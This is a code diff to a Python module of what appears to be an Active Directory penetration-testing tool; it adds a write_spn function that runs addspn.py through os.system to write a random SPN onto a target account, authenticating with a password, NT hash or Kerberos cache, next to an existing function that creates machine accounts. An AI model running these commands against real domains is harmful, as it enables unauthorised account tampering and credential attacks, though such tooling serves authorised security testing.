@@ -1,5 +1,6 @@
 import os
 import config
+import random
 
 def list_acl(box, path):
     config.required_creds(box)
@@ -137,3 +138,21 @@ def addcomputer(box, computer_name='FAKEPC'):
     print(f"\033[95m[#]\033[0m Computer Creds: {computer_name}$ : {computer_password}\t-u {computer_name}$ -p {computer_password}")
     print('\033[92m[+]\033[0m Add computer\n')
     return computer_password
+
+def write_spn(box):
+    config.required_creds(box)
+    config.required_target(box)
+    spn = f"http/{str(random.randint(1, 1000))}test.com"
+    print(f'\033[93m[*]\033[0m Write SPN')
+    if isinstance(box.krb, str):
+        cmd = f"{box.krb_ccache} addspn.py -k -t {box.target} -s {spn} {box.fqdn}"
+    elif box.krb:
+        cmd = f"addspn.py -k -u '{box.domain}\{box.username}' -p {box.password} -t {box.target} -s {spn} {box.fqdn}"
+    elif box.nt_hash:
+        cmd = f"addspn.py -u '{box.domain}\{box.username}' -p :{box.nt_hash} -t {box.target} -s {spn} {box.fqdn}"
+    else:
+        cmd = f"addspn.py -u '{box.domain}\{box.username}' -p {box.password} -t {box.target} -s {spn} {box.fqdn}"
+    config.log_cmd(cmd)
+    print(f'\033[96m[$]\033[0m {cmd}')
+    os.system(cmd)
+    print('\033[92m[+]\033[0m Write SPN\n')
